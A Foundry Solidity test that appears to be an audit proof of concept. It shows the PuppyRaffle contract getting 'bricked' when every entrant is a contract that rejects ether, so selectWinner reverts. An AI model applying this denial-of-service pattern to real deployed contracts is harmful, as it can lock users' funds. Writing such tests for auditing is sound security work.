// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;
pragma experimental ABIEncoderV2;

import {Test, console} from "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";
import {IDontAcceptEther} from "./utils/IDontAcceptEther.sol";

contract Bricked is Test {

    PuppyRaffle puppyRaffle;
    IDontAcceptEther attacker;
    
    uint256 entranceFee = 1e18;
    address playerOne;
    address playerTwo;
    address playerThree;
    address playerFour;
    address feeAddress = address(99);
    uint256 duration = 1 days;

    function setUp() public {
        puppyRaffle = new PuppyRaffle(
            entranceFee,
            feeAddress,
            duration
        );

        playerOne = address(new IDontAcceptEther());
        playerTwo = address(new IDontAcceptEther());
        playerThree = address(new IDontAcceptEther());
        playerFour = address(new IDontAcceptEther());

    }


    // Since the winner wont be able to receive ether, 
    // the whole contract will stop workig and get "bricked"
    function testBrickTheContract() public {
        address[] memory players = new address[](4);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerThree;
        players[3] = playerFour;
        
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
        console.log("4 Players have entered the raffle");

        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number +1);

        vm.expectRevert("PuppyRaffle: Failed to send prize pool to winner");
        puppyRaffle.selectWinner();
    } 
}
